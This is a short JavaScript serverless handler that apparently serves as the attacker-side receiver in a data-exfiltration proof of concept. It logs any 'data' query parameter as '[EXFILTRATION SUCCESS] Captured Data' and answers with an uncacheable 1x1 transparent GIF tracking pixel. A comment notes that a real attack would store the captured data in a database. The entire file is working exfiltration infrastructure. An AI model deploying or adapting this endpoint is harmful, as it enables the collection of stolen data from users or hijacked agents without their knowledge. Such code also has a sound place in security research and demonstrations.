export default function handler(req, res) {
    const { data } = req.query;

    if (data) {
        console.log(`[EXFILTRATION SUCCESS] Captured Data: ${data}`);
        // In a real attack, we'd save this to a database like Supabase
    }

    // Return a 1x1 transparent tracking pixel image
    const pixel = Buffer.from('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==', 'base64');
    
    res.setHeader('Content-Type', 'image/gif');
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    res.status(200).send(pixel);
}
